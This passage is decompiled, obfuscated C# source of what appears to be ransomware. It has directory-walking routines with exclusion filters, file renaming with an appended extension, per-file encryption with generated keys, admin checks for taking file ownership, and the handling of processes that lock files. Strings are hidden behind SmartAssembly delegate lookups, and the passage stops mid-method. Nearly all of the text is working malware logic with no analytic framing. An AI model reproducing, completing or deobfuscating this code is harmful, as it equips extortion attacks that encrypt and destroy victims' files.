using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using UCYqwUXrppN;
using bbZLupGLqlws;

namespace eltZnUpwRizyZ;

internal sealed class OPwDdsoVlNU
{
	public sealed class UAHieNPKtXwJbEqUWn
	{
		private static StringCollection cjKTjXANKAcHt;

		private static List<string> RlImmpAQPgX;

		[NonSerialized]
		internal static GetString _0080;

		public static List<string> SearchFiles(string P_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(P_0);
		}

		private static List<string> WalkDirectoryTree(string P_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(P_0, _0080(107403271));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(_0080(107403266)) && !text.ToLower().Contains(_0080(107403245)) && !text.ToLower().Contains(_0080(107387964)) && !text.ToLower().Contains(_0080(107387983)) && !text.ToLower().Contains(_0080(107403232)) && !text.ToLower().Contains(_0080(107387803)) && !text.ToLower().Contains(_0080(107387776)) && !text.ToLower().Contains(_0080(107387247)) && !text.ToLower().Contains(_0080(107387198)) && !text.ToLower().Contains(_0080(107387213)) && !text.ToLower().Contains(_0080(107387179)) && !text.ToLower().Contains(_0080(107387130)) && !text.ToLower().Contains(_0080(107387145)) && !text.ToLower().Contains(_0080(107387100)) && !text.ToLower().Contains(_0080(107387111)) && !text.ToLower().Contains(_0080(107387066)) && !text.ToLower().Contains(_0080(107387085)) && !text.ToLower().Contains(_0080(107387036)) && !text.ToLower().Contains(_0080(107387051)) && !text.Contains(KsnoBrbTQSaN(_0080(107387002))) && !text.Contains(_0080(107387009)) && !text.Contains(_0080(107387476)) && !text.EndsWith(_0080(107395356)) && !text.EndsWith(_0080(107387451)) && !text.EndsWith(_0080(107387446)) && !text.EndsWith(_0080(107387441)) && !text.EndsWith(_0080(107387468)) && !text.ToLower().Contains(_0080(107387463)) && !text.ToLower().Contains(ugIteiXGeHBYH))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(BKTddpEXUb) * 1024.0 * 1024.0 && ZfmtEkVSEoLZCTN == _0080(107396840))
							{
								RlImmpAQPgX.Add(text);
							}
							else if (File.Exists(text) && ZfmtEkVSEoLZCTN == _0080(107397000))
							{
								RlImmpAQPgX.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(P_0);
				string[] array4 = array2;
				foreach (string text2 in array4)
				{
					WalkDirectoryTree(text2);
				}
			}
			return RlImmpAQPgX;
		}

		static UAHieNPKtXwJbEqUWn()
		{
			Strings.CreateGetStringDelegate(typeof(UAHieNPKtXwJbEqUWn));
			cjKTjXANKAcHt = new StringCollection();
			RlImmpAQPgX = new List<string>();
		}
	}

	private sealed class BVRfrYkBdes
	{
		public string tVcAEMabcgzREe;

		public bool _003CMain_003Eb__6(Process P_0)
		{
			return P_0.ProcessName == tVcAEMabcgzREe;
		}
	}

	private sealed class ORhCIKOMJVstHJ
	{
		public string[] HXJlWfIOGmEEOv;

		public void _003CMain_003Eb__7()
		{
			iYmwFcKSkoMOOW.xiDVoiTHkoM(HXJlWfIOGmEEOv);
		}
	}

	private sealed class AuEkQSfAmTdNp
	{
		private sealed class GkwaWtjWFEcNJ
		{
			public AuEkQSfAmTdNp ocRkDXvnboX;

			public string woijyXwCWvycm;

			public void _003CCrypt_003Eb__23()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					MPFYgxZgXwP(WindowsIdentity.GetCurrent().Name, woijyXwCWvycm);
				}
			}

			public void _003CCrypt_003Eb__24()
			{
				zgTbjjevQpdHp(woijyXwCWvycm, ocRkDXvnboX.HDKGEpCUCuNRunQh, ocRkDXvnboX.ynYNwNLpFIFm, ocRkDXvnboX.GHvyUUGUTGzxFxiI, ocRkDXvnboX.YAhCdHbkNsVH);
			}
		}

		public string[] HDKGEpCUCuNRunQh;

		public string[] GHvyUUGUTGzxFxiI;

		public string YAhCdHbkNsVH;

		public string ynYNwNLpFIFm;

		[NonSerialized]
		internal static GetString _0012;

		public void _003CCrypt_003Eb__22(string P_0)
		{
			GkwaWtjWFEcNJ CS_0024_003C_003E8__locals0 = new GkwaWtjWFEcNJ();
			CS_0024_003C_003E8__locals0.ocRkDXvnboX = this;
			CS_0024_003C_003E8__locals0.woijyXwCWvycm = P_0;
			if (aNXCscvybLN && !qgGdJmyvbjfjKJGn().Contains(_0012(107385466)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						MPFYgxZgXwP(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.woijyXwCWvycm);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (CWdRZmKsDhxK == _0012(107396847))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					zgTbjjevQpdHp(CS_0024_003C_003E8__locals0.woijyXwCWvycm, CS_0024_003C_003E8__locals0.ocRkDXvnboX.HDKGEpCUCuNRunQh, CS_0024_003C_003E8__locals0.ocRkDXvnboX.ynYNwNLpFIFm, CS_0024_003C_003E8__locals0.ocRkDXvnboX.GHvyUUGUTGzxFxiI, CS_0024_003C_003E8__locals0.ocRkDXvnboX.YAhCdHbkNsVH);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				zgTbjjevQpdHp(CS_0024_003C_003E8__locals0.woijyXwCWvycm, HDKGEpCUCuNRunQh, ynYNwNLpFIFm, GHvyUUGUTGzxFxiI, YAhCdHbkNsVH);
			}
		}

		static AuEkQSfAmTdNp()
		{
			Strings.CreateGetStringDelegate(typeof(AuEkQSfAmTdNp));
		}
	}

	private sealed class bFSgRwkHPWbo
	{
		private sealed class IBtzKJhlQtLvo
		{
			public bFSgRwkHPWbo aHlKGcFnWxEbwtDO;

			public string BeiPpNheYGIBoJsVXH;

			[NonSerialized]
			internal static GetString _0086;

			public void _003CWorkerCrypter2_003Eb__30()
			{
				foreach (string item in qUoKxlxkuFsMOBYn)
				{
					if (BeiPpNheYGIBoJsVXH.ToLower().EndsWith(item + aHlKGcFnWxEbwtDO.UEavMcURXNKX) && ASnTkTTzzlTA == _0086(107396858))
					{
						if (Convert.ToInt32(UqzEWVXQurQ) * 1024 * 1024 > new FileInfo(BeiPpNheYGIBoJsVXH).Length)
						{
							try
							{
								wihATTbwYdHSl.FglfIgSlKdgC(_0086(107388431), _0086(107388426), _0086(107388445), BeiPpNheYGIBoJsVXH);
							}
							catch
							{
							}
						}
					}
					else if (BeiPpNheYGIBoJsVXH.ToLower().EndsWith(item) && ASnTkTTzzlTA == _0086(107397018))
					{
						try
						{
							wihATTbwYdHSl.FglfIgSlKdgC(_0086(107388431), _0086(107388426), _0086(107388445), BeiPpNheYGIBoJsVXH);
						}
						catch
						{
						}
					}
				}
			}

			static IBtzKJhlQtLvo()
			{
				Strings.CreateGetStringDelegate(typeof(IBtzKJhlQtLvo));
			}
		}

		private sealed class hktBquzXjce
		{
			public bFSgRwkHPWbo aHlKGcFnWxEbwtDO;

			public string TpoSFZXjxy;

			[NonSerialized]
			internal static GetString _0004;

			public void _003CWorkerCrypter2_003Eb__32()
			{
				foreach (string item in qUoKxlxkuFsMOBYn)
				{
					if (TpoSFZXjxy.ToLower().EndsWith(item + aHlKGcFnWxEbwtDO.UEavMcURXNKX) && ASnTkTTzzlTA == _0004(107396861))
					{
						if (Convert.ToInt32(UqzEWVXQurQ) * 1024 * 1024 > new FileInfo(TpoSFZXjxy).Length)
						{
							try
							{
								wihATTbwYdHSl.FglfIgSlKdgC(_0004(107388434), _0004(107388429), _0004(107388448), TpoSFZXjxy);
							}
							catch
							{
							}
						}
					}
					else if (TpoSFZXjxy.ToLower().EndsWith(item) && ASnTkTTzzlTA == _0004(107397021))
					{
						try
						{
							wihATTbwYdHSl.FglfIgSlKdgC(_0004(107388434), _0004(107388429), _0004(107388448), TpoSFZXjxy);
						}
						catch
						{
						}
					}
				}
			}

			static hktBquzXjce()
			{
				Strings.CreateGetStringDelegate(typeof(hktBquzXjce));
			}
		}

		public List<string> jjHaVHCxepgMDqD;

		public List<string> lJCScpebPQHSGPj;

		public string UEavMcURXNKX;

		public string[] fsyHihgcaeW;

		public string SEgFdxrVdmAS;

		[NonSerialized]
		internal static GetString _001A;

		public void _003CWorkerCrypter2_003Eb__2f(string P_0)
		{
			IBtzKJhlQtLvo CS_0024_003C_003E8__locals0;
			foreach (string item in lJCScpebPQHSGPj)
			{
				if (fsyHihgcaeW.Length != 0)
				{
					string[] array = fsyHihgcaeW;
					foreach (string value in array)
					{
						if (item.EndsWith(value))
						{
							goto IL_09d7;
						}
					}
				}
				try
				{
					if (item.EndsWith(UEavMcURXNKX))
					{
						goto IL_09d7;
					}
				}
				catch (Exception)
				{
					goto IL_09d7;
				}
				if (!item.EndsWith(P_0) || xaJTZrMmiQRAQ.Contains(item))
				{
					continue;
				}
				if (jyiNxqfYATtd == _001A(107396855))
				{
					try
					{
						if (FMLjGROaOe.dwqDkSuHLzr(item))
						{
							FMLjGROaOe.IxCKOOJCCsUF(item);
						}
					}
					catch
					{
					}
				}
				xaJTZrMmiQRAQ.Add(item);
				if (!aFoYhEArnYRtqzv.Contains(Path.GetDirectoryName(item)))
				{
					aFoYhEArnYRtqzv.Add(Path.GetDirectoryName(item));
				}
				HHXouuwktdLUSFk(item);
				try
				{
					new KWOuChclelrn().OwONsISXXOOpf(item);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (IHUVFGfndtpl)
							{
								Console.WriteLine(_001A(107403230) + item + _001A(107403185) + new FileInfo(item).Length + _001A(107403164));
								Console.WriteLine(_001A(107403155));
							}
						}
						catch
						{
						}
						MkUJPBjeBrD(KsnoBrbTQSaN(_001A(107402506)), _001A(107387362) + item + _001A(107387362) + KsnoBrbTQSaN(_001A(107402513)) + _001A(107387362) + Environment.UserName + _001A(107387362) + KsnoBrbTQSaN(_001A(107402464)));
					}
				}
				catch (Exception ex2)
				{
					if (QCmKQKwvWBrFEj)
					{
						try
						{
							File.AppendAllText(hBPcxbXfrBbYZwL, _001A(107385608) + item + _001A(107402439) + ex2.Message + _001A(107396224));
						}
						catch (Exception)
						{
						}
					}
					continue;
				}
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0)
						{
							continue;
						}
					}
					catch (Exception ex4)
					{
						if (QCmKQKwvWBrFEj)
						{
							try
							{
								File.AppendAllText(hBPcxbXfrBbYZwL, _001A(107385608) + item + _001A(107402390) + ex4.Message + _001A(107396224));
							}
							catch (Exception)
							{
							}
						}
						WetxdZxAdgUqT++;
						goto end_IL_02ca;
					}
					if (ZgMAQkWlMGVlQB == _001A(107396855) && new FileInfo(item).Length > Convert.ToInt32(phsLIEBLTPR) * 1024 * 1024 && !jjHaVHCxepgMDqD.Contains(P_0))
					{
						CS_0024_003C_003E8__locals0 = new IBtzKJhlQtLvo();
						CS_0024_003C_003E8__locals0.aHlKGcFnWxEbwtDO = this;
						try
						{
							if (UEavMcURXNKX != _001A(107385868))
							{
								if (uDFeFGGkwluj)
								{
									UEavMcURXNKX = cshPaWeUxvVg + UEavMcURXNKX;
								}
								File.Move(item, item + UEavMcURXNKX);
							}
						}
						catch (Exception ex6)
						{
							if (QCmKQKwvWBrFEj)
							{
								try
								{
									File.AppendAllText(hBPcxbXfrBbYZwL, _001A(107385608) + item + _001A(107402841) + ex6.Message + _001A(107396224));
								}
								catch (Exception)
								{
								}
							}
							WetxdZxAdgUqT++;
							goto end_IL_02ca;
						}
						CS_0024_003C_003E8__locals0.BeiPpNheYGIBoJsVXH = _001A(107388379);
						if (UEavMcURXNKX != _001A(107385868))
						{
							CS_0024_003C_003E8__locals0.BeiPpNheYGIBoJsVXH = item + UEavMcURXNKX;
						}
						else
						{
							CS_0024_003C_003E8__locals0.BeiPpNheYGIBoJsVXH = item;
						}
						if (XLjwIPnIAHXCZ == _001A(107396855))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in qUoKxlxkuFsMOBYn)
								{
									if (CS_0024_003C_003E8__locals0.BeiPpNheYGIBoJsVXH.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.aHlKGcFnWxEbwtDO.UEavMcURXNKX) && ASnTkTTzzlTA == IBtzKJhlQtLvo._0086(107396858))
									{
										if (Convert.ToInt32(UqzEWVXQurQ) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.BeiPpNheYGIBoJsVXH).Length)
										{
											try
											{
												wihATTbwYdHSl.FglfIgSlKdgC(IBtzKJhlQtLvo._0086(107388431), IBtzKJhlQtLvo._0086(107388426), IBtzKJhlQtLvo._0086(107388445), CS_0024_003C_003E8__locals0.BeiPpNheYGIBoJsVXH);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.BeiPpNheYGIBoJsVXH.ToLower().EndsWith(item2) && ASnTkTTzzlTA == IBtzKJhlQtLvo._0086(107397018))
									{
										try
										{
											wihATTbwYdHSl.FglfIgSlKdgC(IBtzKJhlQtLvo._0086(107388431), IBtzKJhlQtLvo._0086(107388426), IBtzKJhlQtLvo._0086(107388445), CS_0024_003C_003E8__locals0.BeiPpNheYGIBoJsVXH);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						string text = FctLWdSYKGLPR.NCHlcfUWfflUhH(32);
						string s = WvhZaNjlczTpSemA.ApMfxATNQTnF(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (YtsYOxvPhpYvsqia == _001A(107397015))
						{
							byte[] array2 = null;
							byte[] array3 = ujXrqFZLIuhev.mYXsIDdSmNYSk(CS_0024_003C_003E8__locals0.BeiPpNheYGIBoJsVXH, Convert.ToInt32(phsLIEBLTPR) * 1024 * 1024);
							if (ujXrqFZLIuhev.qervcdxCETqmk(hgtQklihbol: (!LZWNsbTTjOGKx) ? (OmLPyoScyL ? ujXrqFZLIuhev.jsetmJbXIvBqD(array3, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : ujXrqFZLIuhev.jsetmJbXIvBqD(array3, Encoding.ASCII.GetBytes(SEgFdxrVdmAS), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (OmLPyoScyL ? SORyNXckDwab.kxKjqVUBRvIzUxx(array3, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : SORyNXckDwab.kxKjqVUBRvIzUxx(array3, Encoding.ASCII.GetBytes(SEgFdxrVdmAS), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), JZMrFIOjlmFGmC: CS_0024_003C_003E8__locals0.BeiPpNheYGIBoJsVXH, LtdxxvPkxj: bytes))
							{
								goto IL_09d7;
							}
							try
							{
								File.Move(item + UEavMcURXNKX, item);
							}
							catch (Exception)
							{
							}
						}
						else if (!OmLPyoScyL)
						{
							if (iJsQqEPvGCEvi.CbPjLHJdSiaV(CS_0024_003C_003E8__locals0.BeiPpNheYGIBoJsVXH, phsLIEBLTPR, SEgFdxrVdmAS))
							{
								goto IL_09d7;
							}
							try
							{
								File.Move(item + UEavMcURXNKX, item);
							}
							catch (Exception)
							{
							}
						}
						else
						{
							if (iJsQqEPvGCEvi.CbPjLHJdSiaV(CS_0024_003C_003E8__locals0.BeiPpNheYGIBoJsVXH, phsLIEBLTPR, text, bytes))
							{
								goto IL_09d7;
							}
							try
							{
								File.Move(item + UEavMcURXNKX, item);
							}
							catch (Exception)
							{
							}
						}
						continue;
					}
					if (uDFeFGGkwluj)
					{
						UEavMcURXNKX = cshPaWeUxvVg + UEavMcURXNKX;
					}
					string text2 = FctLWdSYKGLPR.NCHlcfUWfflUhH(32);
					string s2 = WvhZaNjlczTpSemA.ApMfxATNQTnF(text2);
					byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
					if (UEavMcURXNKX != _001A(107385868))
					{
						if (!heKpdwyJrkK)
						{
							if (!OmLPyoScyL)
							{
								onQMKOyLMArp(item, item + UEavMcURXNKX, JgtXDzoKBYSkMTJ);
							}
							else
							{
								onQMKOyLMArp(item, item + UEavMcURXNKX, Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!OmLPyoScyL)
								{
									sZrgcGPnICGjr(item, item + UEavMcURXNKX, JgtXDzoKBYSkMTJ);
								}
								else
								{
									sZrgcGPnICGjr(item, item + UEavMcURXNKX, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex11)
							{
								if (QCmKQKwvWBrFEj)
								{
									try
									{
										File.AppendAllText(hBPcxbXfrBbYZwL, _001A(107385608) + item + _001A(107385886) + ex11.Message + _001A(107396224));
									}
									catch (Exception)
									{
									}
								}
								WetxdZxAdgUqT++;
								try
								{
									File.Move(item + UEavMcURXNKX, item);
								}
								catch (Exception)
								{
								}
								goto end_IL_02ca;
							}
						}
					}
					else if (!heKpdwyJrkK)
					{
						if (!OmLPyoScyL)
						{
							onQMKOyLMArp(item, item + _001A(107385863), JgtXDzoKBYSkMTJ);
						}
						else
						{
							onQMKOyLMArp(item, item + _001A(107385863), Encoding.ASCII.GetBytes(text2));
						}
					}
					else
					{
						try
						{
							if (!OmLPyoScyL)
							{
								sZrgcGPnICGjr(item, item, JgtXDzoKBYSkMTJ);
							}
							else
							{
								sZrgcGPnICGjr(item, item, Encoding.ASCII.GetBytes(text2));
							}
						}
						catch (Exception ex14)
						{
							if (QCmKQKwvWBrFEj)
							{
								try
								{
									File.AppendAllText(hBPcxbXfrBbYZwL, _001A(107385608) + item + _001A(107385886) + ex14.Message + _001A(107396224));
								}
								catch (Exception)
								{
								}
							}
							WetxdZxAdgUqT++;
							goto end_IL_02ca;
						}
					}
					if (OmLPyoScyL)
					{
						if (UEavMcURXNKX != _001A(107385868))
						{
							NdxUyyyATtE(item + UEavMcURXNKX, bytes2);
						}
						else
						{
							NdxUyyyATtE(item, bytes2);
						}
					}
					goto IL_09d7;
					end_IL_02ca:;
				}
				catch (Exception)
				{
					goto IL_09d7;
				}
				continue;
				IL_09d7:
				lJCScpebPQHSGPj.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__31(string P_0)
		{
			hktBquzXjce CS_0024_003C_003E8__locals0 = new hktBquzXjce();
			CS_0024_003C_003E8__locals0.aHlKGcFnWxEbwtDO = this;
			CS_0024_003C_003E8__locals0.TpoSFZXjxy = P_0;
			if (fsyHihgcaeW.Length != 0)
			{
				string[] array = fsyHihgcaeW;
				foreach (string value in array)
				{
					if (CS_0024_003C_003E8__locals0.TpoSFZXjxy.EndsWith(value))
					{
						goto IL_0ab8;
					}
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.TpoSFZXjxy.EndsWith(UEavMcURXNKX))
				{
					goto IL_0ab8;
				}
			}
			catch (Exception)
			{
				goto IL_0ab8;
			}
			if (!xaJTZrMmiQRAQ.Contains(CS_0024_003C_003E8__locals0.TpoSFZXjxy))
			{
				if (jyiNxqfYATtd == _001A(107396855))
				{
					try
					{
						if (FMLjGROaOe.dwqDkSuHLzr(CS_0024_003C_003E8__locals0.TpoSFZXjxy))
						{
							FMLjGROaOe.IxCKOOJCCsUF(CS_0024_003C_003E8__locals0.TpoSFZXjxy);
						}
					}
					catch
					{
					}
				}
				xaJTZrMmiQRAQ.Add(CS_0024_003C_003E8__locals0.TpoSFZXjxy);
				if (!aFoYhEArnYRtqzv.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.TpoSFZXjxy)))
				{
					aFoYhEArnYRtqzv.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.TpoSFZXjxy));
				}
				HHXouuwktdLUSFk(CS_0024_003C_003E8__locals0.TpoSFZXjxy);
				try
				{
					new KWOuChclelrn().OwONsISXXOOpf(CS_0024_003C_003E8__locals0.TpoSFZXjxy);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.TpoSFZXjxy, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (IHUVFGfndtpl)
							{
								Console.WriteLine(_001A(107403230) + CS_0024_003C_003E8__locals0.TpoSFZXjxy + _001A(107403185) + new FileInfo(CS_0024_003C_003E8__locals0.TpoSFZXjxy).Length + _001A(107403164));
								Console.WriteLine(_001A(107403155));
							}
						}
						catch
						{
						}
						MkUJPBjeBrD(KsnoBrbTQSaN(_001A(107402506)), _001A(107387362) + CS_0024_003C_003E8__locals0.TpoSFZXjxy + _001A(107387362) + KsnoBrbTQSaN(_001A(107402513)) + _001A(107387362) + Environment.UserName + _001A(107387362) + KsnoBrbTQSaN(_001A(107402464)));
					}
				}
				catch (Exception ex2)
				{
					if (QCmKQKwvWBrFEj)
					{
						try
						{
							File.AppendAllText(hBPcxbXfrBbYZwL, _001A(107385608) + CS_0024_003C_003E8__locals0.TpoSFZXjxy + _001A(107402439) + ex2.Message + _001A(107396224));
							return;
						}
						catch (Exception)
						{
							return;
						}
					}
					return;
				}
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.TpoSFZXjxy).Length != 0)
						{
							goto end_IL_031b;
						}
						goto end_IL_031b_2;
						end_IL_031b:;
					}
					catch (Exception ex4)
					{
						if (QCmKQKwvWBrFEj)
						{
							try
							{
								File.AppendAllText(hBPcxbXfrBbYZwL, _001A(107385608) + CS_0024_003C_003E8__locals0.TpoSFZXjxy + _001A(107402390) + ex4.Message + _001A(107396224));
							}
							catch (Exception)
							{
							}
						}
						WetxdZxAdgUqT++;
						goto end_IL_031b_2;
					}
					if (ZgMAQkWlMGVlQB == _001A(107396855) && new FileInfo(CS_0024_003C_003E8__locals0.TpoSFZXjxy).Length > Convert.ToInt32(phsLIEBLTPR) * 1024 * 1024)
					{
						try
						{
							if (UEavMcURXNKX != _001A(107385868))
							{
								if (uDFeFGGkwluj)
								{
									UEavMcURXNKX = cshPaWeUxvVg + UEavMcURXNKX;
								}
								File.Move(CS_0024_003C_003E8__locals0.TpoSFZXjxy, CS_0024_003C_003E8__locals0.TpoSFZXjxy + UEavMcURXNKX);
							}
						}
						catch (Exception ex6)
						{
							if (QCmKQKwvWBrFEj)
							{
								try
								{
									File.AppendAllText(hBPcxbXfrBbYZwL, _001A(107385608) + CS_0024_003C_003E8__locals0.TpoSFZXjxy + _001A(107402841) + ex6.Message + _001A(107396224));
								}
								catch (Exception)
								{
								}
							}
							WetxdZxAdgUqT++;
							return;
						}
						if (UEavMcURXNKX != _001A(107385868))
						{
							CS_0024_003C_003E8__locals0.TpoSFZXjxy += UEavMcURXNKX;
						}
						if (XLjwIPnIAHXCZ == _001A(107396855))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item in qUoKxlxkuFsMOBYn)
								{
									if (CS_0024_003C_003E8__locals0.TpoSFZXjxy.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.aHlKGcFnWxEbwtDO.UEavMcURXNKX) && ASnTkTTzzlTA == hktBquzXjce._0004(107396861))
									{
										if (Convert.ToInt32(UqzEWVXQurQ) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.TpoSFZXjxy).Length)
										{
											try
											{
												wihATTbwYdHSl.FglfIgSlKdgC(hktBquzXjce._0004(107388434), hktBquzXjce._0004(107388429), hktBquzXjce._0004(107388448), CS_0024_003C_003E8__locals0.TpoSFZXjxy);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.TpoSFZXjxy.ToLower().EndsWith(item) && ASnTkTTzzlTA == hktBquzXjce._0004(107397021))
									{
										try
										{
											wihATTbwYdHSl.FglfIgSlKdgC(hktBquzXjce._0004(107388434), hktBquzXjce._0004(107388429), hktBquzXjce._0004(107388448), CS_0024_003C_003E8__locals0.TpoSFZXjxy);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = FctLWdSYKGLPR.NCHlcfUWfflUhH(32);
						string s = WvhZaNjlczTpSemA.ApMfxATNQTnF(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (YtsYOxvPhpYvsqia == _001A(107397015))
						{
							byte[] array2 = null;
							byte[] array3 = ujXrqFZLIuhev.mYXsIDdSmNYSk(CS_0024_003C_003E8__locals0.TpoSFZXjxy, Convert.ToInt32(phsLIEBLTPR) * 1024 * 1024);
							if (!ujXrqFZLIuhev.qervcdxCETqmk(hgtQklihbol: (!LZWNsbTTjOGKx) ? (OmLPyoScyL ? ujXrqFZLIuhev.jsetmJbXIvBqD(array3, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : ujXrqFZLIuhev.jsetmJbXIvBqD(array3, Encoding.ASCII.GetBytes(SEgFdxrVdmAS), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (OmLPyoScyL ? SORyNXckDwab.kxKjqVUBRvIzUxx(array3, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : SORyNXckDwab.kxKjqVUBRvIzUxx(array3, Encoding.ASCII.GetBytes(SEgFdxrVdmAS), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), JZMrFIOjlmFGmC: CS_0024_003C_003E8__locals0.TpoSFZXjxy, LtdxxvPkxj: bytes))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.TpoSFZXjxy + UEavMcURXNKX, CS_0024_003C_003E8__locals0.TpoSFZXjxy);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!OmLPyoScyL)
						{
							if (!iJsQqEPvGCEvi.CbPjLHJdSiaV(CS_0024_003C_003E8__locals0.TpoSFZXjxy, phsLIEBLTPR, SEgFdxrVdmAS))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.TpoSFZXjxy + UEavMcURXNKX, CS_0024_003C_003E8__locals0.TpoSFZXjxy);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!iJsQqEPvGCEvi.CbPjLHJdSiaV(CS_0024_003C_003E8__locals0.TpoSFZXjxy, phsLIEBLTPR, text, bytes))
						{
							try
							{
								File.Move(CS_0024_003C_003E8__locals0.TpoSFZXjxy + UEavMcURXNKX, CS_0024_003C_003E8__locals0.TpoSFZXjxy);
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
					}
					else
					{
						if (uDFeFGGkwluj)
						{
							UEavMcURXNKX = cshPaWeUxvVg + UEavMcURXNKX;
						}
						string text2 = FctLWdSYKGLPR.NCHlcfUWfflUhH(32);
						string s2 = WvhZaNjlczTpSemA.ApMfxATNQTnF(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (UEavMcURXNKX != _001A(107385868))
						{
							if (!heKpdwyJrkK)
							{
								if (!OmLPyoScyL)
								{
									onQMKOyLMArp(CS_0024_003C_003E8__locals0.TpoSFZXjxy, CS_0024_003C_003E8__locals0.TpoSFZXjxy + UEavMcURXNKX, JgtXDzoKBYSkMTJ);
								}
								else
								{
									onQMKOyLMArp(CS_0024_003C_003E8__locals0.TpoSFZXjxy, CS_0024_003C_003E8__locals0.TpoSFZXjxy + UEavMcURXNKX, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!OmLPyoScyL)
									{
										sZrgcGPnICGjr(CS_0024_003C_003E8__locals0.TpoSFZXjxy, CS_0024_003C_003E8__locals0.TpoSFZXjxy + UEavMcURXNKX, JgtXDzoKBYSkMTJ);
									}
									else
									{
										sZrgcGPnICGjr(CS_0024_003C_003E8__locals0.TpoSFZXjxy, CS_0024_003C_003E8__locals0.TpoSFZXjxy + UEavMcURXNKX, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex11)
								{
									if (QCmKQKwvWBrFEj)
									{
										try
										{
											File.AppendAllText(hBPcxbXfrBbYZwL, _001A(107385608) + CS_0024_003C_003E8__locals0.TpoSFZXjxy + _001A(107385886) + ex11.Message + _001A(107396224));
										}
										catch (Exception)
										{
										}
									}
									WetxdZxAdgUqT++;
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.TpoSFZXjxy + UEavMcURXNKX, CS_0024_003C_003E8__locals0.TpoSFZXjxy);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
						}
						else if (!heKpdwyJrkK)
						{
							if (!OmLPyoScyL)
							{
								onQMKOyLMArp(CS_0024_003C_003E8__locals0.TpoSFZXjxy, CS_0024_003C_003E8__locals0.TpoSFZXjxy + _001A(107385863), JgtXDzoKBYSkMTJ);
							}
							else
							{
								onQMKOyLMArp(CS_0024_003C_003E8__locals0.TpoSFZXjxy, CS_0024_003C_003E8__locals0.TpoSFZXjxy + _001A(107385863), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!OmLPyoScyL)
								{
